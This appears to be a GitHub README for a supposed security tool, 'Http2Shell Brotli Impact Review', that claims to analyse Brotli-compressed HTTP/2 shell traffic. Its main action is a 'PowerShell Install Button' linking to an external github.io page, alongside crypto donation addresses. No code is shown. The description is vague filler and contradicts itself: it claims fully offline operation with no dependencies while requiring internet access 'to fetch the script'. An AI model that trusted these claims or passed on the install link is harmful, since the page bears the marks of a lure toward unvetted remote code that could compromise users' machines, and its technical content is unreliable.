<div align="center">

# Http2Shell Brotli Impact Review — Security Tool

![](files/preview.png)

### 📦 PowerShell Install Button

<a href="https://elmati279.github.io/http2shell-brotli-impact-review/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![ci](https://img.shields.io/badge/Ci-Success-2ea44f?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Released-2ea44f?style=flat&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-ec4899?style=flat&labelColor=0d1117)]()

<div align="center">
<h3>Help keep this going</h3>
<p><strong>BTC</strong>:&nbsp;<code>1PeyUMWHStDCHdySEhc14Ywx8te7dHtoJD</code> | <strong>ETH</strong>:&nbsp;<code>0x75e7383595Faa32CcE7a530Fb6D864259e8a1750</code></p>
</div>

</div>

---

http2shell-brotli-impact-review is a standalone analysis utility for evaluating how Brotli-compressed HTTP/2 payloads affect shell-based tooling and downstream processing in the http2shell workflow. It parses captured streams, measures compression ratios and decompression costs, and reports concrete impact metrics for each tested input. All checks run locally against supplied artifacts, with deterministic outputs and no external dependencies at runtime. Results are intended to support risk assessment and remediation decisions with reproducible, verifiable data.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Parses HTTP/2 frame streams and isolates HEADERS and DATA frames for per-stream analysis, preserving HPACK-compressed header blocks for inspection without requiring prior decompression.
- Decompresses Brotli-encoded response bodies and extracts compression metadata (window size, block count, ratio) to support impact assessment of Brotli handling on shell-oriented payloads.
- Computes per-stream compression ratios and size deltas between compressed and decompressed payloads, with configurable thresholds for flagging anomalous expansion or contraction.
- Detects and reports HPACK dynamic table behavior, including header field indexing patterns and table size updates, to surface state-dependent header compression effects.
- Emits structured findings in JSON with stable schema fields (stream ID, frame type, byte counts, ratio, classification) for downstream tooling and reproducible review.
- Operates deterministically on captured inputs: identical input yields identical output, with no network calls or telemetry during analysis.
- Validates Brotli stream integrity and reports truncation, malformed blocks, or trailing data separately from decompression results.
- Supports batch processing of multiple capture files with per-file summaries and aggregate statistics.
- Includes a rule-based classifier that maps observed Brotli and HPACK characteristics to documented impact categories, with rule identifiers included in output for auditability.
- Runs as a local, dependency-minimal process with no elevated privileges required and no persistent state written outside the designated output directory.

## How it works

The tool operates as a static review harness rather than an active exploitation framework. It ingests a user-supplied corpus of HTTP/2 traffic captures and configuration snapshots, then evaluates each sample against a fixed rule set describing how Brotli-compressed response bodies interact with shell-oriented payload delivery paths.

Processing proceeds in four deterministic stages. First, input normalization parses the capture or configuration into a canonical record: stream identifiers, header blocks, compression flags, content-encoding declarations, and body digests. Second, a compression classifier inspects the declared and observed encoding of each response body, distinguishing Brotli from identity, gzip, and deflate, and flagging mismatches between advertised and actual encodings. Third, a rule engine applies the review checks, comparing decompressed body characteristics against known impact indicators such as size asymmetry between compressed and expanded payloads, abrupt stream resets during body transmission, and header ordering that affects intermediary buffering. Fourth, results are aggregated into a per-sample verdict with supporting evidence references to the originating record fields.

All analysis is performed locally against the provided samples. No network egress is initiated by the review process, and no sample content is transmitted off-host. The rule set is versioned and bundled with the tool so that verdicts are reproducible across runs; each report records the rule-set version and input digests, allowing independent re-verification. Output is emitted in machine-readable form and includes, for every finding, the rule identifier, the affected stream, and the exact field offsets consulted, so conclusions can be audited without re-running the tool.

## Modules and Settings

### Review Scenario Configuration
Establishes the saved baseline that every other module draws from, so that comparisons and reports remain consistent across repeated review runs.
- Target traffic pattern selector defines the request sequence shape and session characteristics the rest of the review will reference.
- Inspection environment profile records the monitoring and filtering context in which the modeled traffic is observed.
- Scenario persistence saves the profile for reuse, letting later runs and handoffs start from identical conditions.

### HTTP/2 Shell Traffic Modeling
Produces a structured trace of shell-oriented HTTP/2 exchanges so reviewers can examine how request framing and stream behavior are represented.
- Stream grouping control adjusts how requests are distributed across streams, changing the shape of the recorded trace.
- Session lifetime expression sets how long the modeled session persists within the scenario.
- Trace view presents the modeled exchanges in a comparable format for cross-scenario analysis.

### Brotli Payload Impact Comparison
Runs Brotli-encoded and equivalent uncompressed payloads within the same scenario to isolate the effect of the encoding choice.
- Encoding declaration settings control how encoded bodies are identified to the inspection layer.
- Body segmentation option adjusts how encoded payloads are divided across the exchange.
- Side-by-side comparison view shows how each variant is described by inspection, supporting attribution of observed effects to encoding.

### Inspection and Detection Outcome Reporting
Collects per-exchange treatment into the review's core deliverable, recording how the configured inspection setup handled each modeled exchange.
- Outcome emphasis selector lets the user prioritize content visibility, classification, or policy action in the report.
- Annotation support attaches reviewer notes to specific exchanges and scenarios.
- Report listing pairs each scenario and variant with its observed outcome for structured review.

### Policy Rule Evaluation
Checks whether attached policy rules produce the expected decisions for modeled HTTP/2 shell traffic and Brotli-encoded payloads.
- Rule attachment links policy conditions to a scenario so decisions are evaluated within that context.
- Between-run rule adjustment reveals which conditions change outcomes across iterations.
- Per-exchange decision record shows rule matches and the resulting actions for each modeled exchange.

### Controlled Variation and Replay
Replays scenarios with single deliberate changes so reviewers can identify which factor drives an observed outcome.
- Parameter-level adjustment changes one setting at a time while holding the rest of the scenario fixed.
- Paired-run output highlights differences between runs, such as toggling Brotli encoding on or off.
- Variation history keeps changed parameters visible alongside results for traceability.

### Additional Settings
Optional controls that support review workflow and handoff without altering the core scenario logic.
- Evidence selection chooses which scenario profiles, run records, and annotations are included in a review bundle.
- Bundle packaging produces a self-contained handoff artifact another analyst can open under the same conditions.
- Run labeling tags scenarios and replays for easier identification during later comparison.
- Comparison baseline designation marks one run as the reference point for variation and outcome diffs.

## Usage Scenarios

### Reviewing Brotli Encoding Effect on Inspection Visibility
**Goal:** A security engineer wants to understand whether enabling Brotli payload encoding changes how much of a shell-oriented HTTP/2 exchange remains visible to the inspection layer, before deciding whether encoding deserves extra scrutiny in the review.
**Steps:**
1. Create a review scenario profile in Review Scenario Configuration, selecting the target traffic pattern for the shell-oriented request sequence and recording the inspection environment profile.
2. Model the exchange in HTTP/2 Shell Traffic Modeling, adjusting stream grouping and session lifetime expression so the trace reflects the intended session shape.
3. Run the same scenario twice in Brotli Payload Impact Comparison: once with Brotli encoding enabled and once with an equivalent uncompressed payload, using encoding declaration settings and body segmentation to define each variant.
4. Use the side-by-side comparison view to inspect how each variant is described by the inspection layer.
5. Emphasize content visibility in Inspection and Detection Outcome Reporting and annotate the exchanges where the two variants diverge.

**Expected result:** A report listing both variants with their observed outcomes, showing which exchanges differed in content visibility between the Brotli-encoded and uncompressed runs, with reviewer annotations marking the exchanges where the encoding choice appeared to affect inspection.

### Evaluating Policy Rules Against Modeled HTTP/2 Shell Traffic
**Goal:** A defensive analyst wants to check whether the organization's attached policy rules produce the expected decisions when shell-oriented HTTP/2 traffic carries Brotli-encoded payloads.
**Steps:**
1. Load an existing scenario profile from Review Scenario Configuration so the policy evaluation runs under the same conditions as prior reviews.
2. Attach the relevant policy conditions to the scenario using Rule Attachment in Policy Rule Evaluation.
3. Run the scenario with Brotli encoding enabled and examine the per-exchange decision record for rule matches and resulting actions.
4. Adjust one rule condition between runs to see whether the decision changes, keeping the rest of the scenario fixed.
5. Tag each run with a label for later identification and select policy action as the emphasis in Inspection and Detection Outcome Reporting.

**Expected result:** A per-exchange decision record for each run showing which rules matched and what action followed, plus a report section highlighting policy actions, making it clear which rule conditions changed the outcome when Brotli-encoded payloads were present.

### Isolating a Single Factor Through Controlled Replay and Packaging a Handoff
**Goal:** A red-team reviewer wants to determine whether a specific setting — Brotli encoding being switched on or off — is responsible for an observed difference, and then hand the findings to another analyst for reproduction.
**Steps:**
1. Designate the initial run as the comparison baseline in Additional Settings so subsequent replays are measured against it.
2. Use Controlled Variation and Replay to adjust only the Brotli encoding toggle at the parameter level, holding the remaining scenario settings fixed.
3. Review the paired-run output and variation history to confirm the changed parameter and the resulting differences.
4. Add annotations to the exchanges of interest and tag each replay run for identification.
5. Select the baseline scenario profile, both run records, and the annotations for evidence selection, then package the review bundle.

**Expected result:** A set of paired runs whose differences are attributable to the single toggled setting, accompanied by a variation history listing the changed parameter, and a self-contained review bundle that another analyst can open to inspect the same scenarios, run records, and annotations.

## Privacy

This tool operates entirely offline and does not transmit, collect, or store any data beyond the local filesystem on which it is executed. No telemetry, analytics, crash reporting, or usage statistics are generated or sent anywhere. The tool makes no outbound network connections during normal operation; any network activity observed must originate from the user's own environment or from explicitly invoked components outside this project's scope.

All inputs, including configuration files, captured artifacts, and analysis results, remain on the local machine under the user's control. The tool does not read files outside the paths explicitly provided by the user, does not access environment variables unrelated to its configuration, and does not persist state between runs unless the user directs it to write output to disk. Temporary files, if created, are written to user-specified or system-designated temporary directories and are not retained after the process exits.

No credentials, tokens, keys, or personally identifiable information are required by the tool to function, and none are logged. If the user supplies sensitive data as input, that data is processed in memory or written only to the locations the user specifies; the project itself introduces no additional exposure surface. Users are responsible for the security of the host environment, file permissions, and any data they choose to process.

The tool contains no hidden data flows, no embedded endpoints, and no remote configuration fetches. Its behavior is fully determined by the code present in the local checkout and the inputs provided at runtime. Any deviation from this behavior should be treated as a integrity concern and reported through the project's established channels.

## FAQ

**Q: What does Http2Shell Brotli Impact Review actually analyze?**
A: It evaluates how Brotli-compressed HTTP/2 traffic affects the behavior of an HTTP/2-based shell channel. The review focuses on measurable characteristics: compression ratio, decompression cost, frame-level size changes, and how those factors influence throughput and resource usage on both endpoints.

**Q: Is this a production hardening tool or an assessment utility?**
A: It is an assessment utility. It produces observations and measurements intended to inform configuration and risk decisions. It does not modify the target project's runtime, patch binaries, or enforce policy.

**Q: How does Brotli compression interact with HTTP/2 framing in this review?**
A: Brotli operates at the message payload level, while HTTP/2 provides stream multiplexing and frame-level structure. The review examines how compressed payloads map onto DATA frames, how header block behavior is affected, and whether compression changes observable traffic patterns such as frame timing and size distribution.

**Q: What data does the review collect?**
A: It collects protocol-level metadata: frame types and sizes, stream identifiers, compression ratios, timing deltas, and aggregate counters. It does not require access to plaintext application data to produce its core metrics.

**Q: Does the review transmit data to any external endpoint?**
A: No. All analysis is performed locally by the target project. The review has no telemetry, no remote reporting, and no outbound data collection.

**Q: What are the known limitations?**
A: Results depend on the specific Brotli quality level, window size, and HTTP/2 implementation under test. Compression behavior varies with payload entropy, so benchmarks are not directly comparable across dissimilar workloads. The review characterizes behavior; it does not certify security.

**Q: How should results be interpreted?**
A: Treat the output as empirical measurements, not guarantees. Compression ratio and decompression cost are workload-dependent. Use the findings to guide configuration review and to identify where resource limits or protocol settings warrant closer inspection.

**Q: Is the review reproducible?**
A: Yes, provided the same input corpus, Brotli parameters, and HTTP/2 stack are used. The review documents its measurement methodology so results can be reproduced and compared under controlled conditions.

**Q: What are the system requirements?**
A: A supported HTTP/2-capable runtime and sufficient local resources to perform compression and decompression during measurement. Exact requirements depend on the size of the input corpus and the Brotli quality settings selected.

**Q: How is the review kept current?**
A: The review tracks changes in HTTP/2 and Brotli specifications and updates its measurement logic accordingly. Version history is maintained with the target project so that differences between releases are auditable.

## Disclaimer

This project is provided for defensive security research, authorized testing, and educational use only. It is intended to help security engineers, administrators, and researchers assess the impact of Brotli-compressed HTTP/2 traffic on shell-oriented workloads in controlled environments. Use of this project against systems, networks, or applications without explicit written authorization from the owner is prohibited and may violate local, national, or international law. The maintainers do not condone, support, or take responsibility for unauthorized, malicious, or unlawful use.

The project is supplied on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, accuracy, and non-infringement. No guarantee is made regarding correctness, completeness, reliability, or suitability for any particular environment or threat model. Results produced by this project are dependent on configuration, input data, network conditions, and third-party components, and should be independently validated before being relied upon for security decisions.

You are solely responsible for determining whether your use of this project complies with applicable laws, regulations, contractual obligations, and organizational policies, including those governing network monitoring, traffic interception, data handling, and penetration testing. Any data processed by this project remains your responsibility, including its collection, storage, retention, and disclosure. The maintainers assume no liability for direct, indirect, incidental, special, consequential, or punitive damages, or for any loss of data, profits, or business interruption, arising from the use or inability to use this project, even if advised of the possibility of such damages.

This project may interact with third-party software, protocols, and services whose behavior is outside the maintainers' control. Compatibility, performance, and security characteristics of such components are not guaranteed and may change without notice. References to specific technologies, such as HTTP/2 or Brotli, are descriptive of scope and do not imply endorsement by or affiliation with their respective standards bodies or implementers. The maintainers reserve the right to modify, suspend, or discontinue the project at any time without notice, and to update this disclaimer as the project evolves; continued use after changes constitutes acceptance of the revised terms.

## License

This project is released under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the copyright notice and permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. Users are responsible for ensuring their use of this tool complies with applicable laws and regulations in their jurisdiction.